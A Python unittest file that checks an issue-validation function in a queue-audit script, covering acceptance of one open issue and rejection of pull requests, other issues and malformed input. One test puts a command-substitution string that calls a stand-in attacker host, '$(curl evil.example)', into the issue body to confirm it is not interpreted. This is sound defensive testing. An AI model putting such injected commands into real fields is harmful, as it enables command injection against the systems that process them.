import unittest
from scripts.visura_queue_audit import validate_issue


class QueueAuditTests(unittest.TestCase):
    def test_valid_open_issue(self):
        self.assertEqual(validate_issue({"number": 31, "state": "open"}), {"number": 31, "state": "open"})

    def test_rejects_pull_request(self):
        with self.assertRaises(ValueError):
            validate_issue({"number": 31, "state": "open", "pull_request": {}})

    def test_rejects_other_issue(self):
        with self.assertRaises(ValueError):
            validate_issue({"number": 32, "state": "open"})

    def test_rejects_malformed_payload(self):
        with self.assertRaises(ValueError):
            validate_issue("untrusted data")

    def test_does_not_interpret_body(self):
        payload = {"number": 31, "state": "open", "body": "$(curl evil.example)"}
        self.assertEqual(validate_issue(payload)["number"], 31)


if __name__ == "__main__":
    unittest.main()
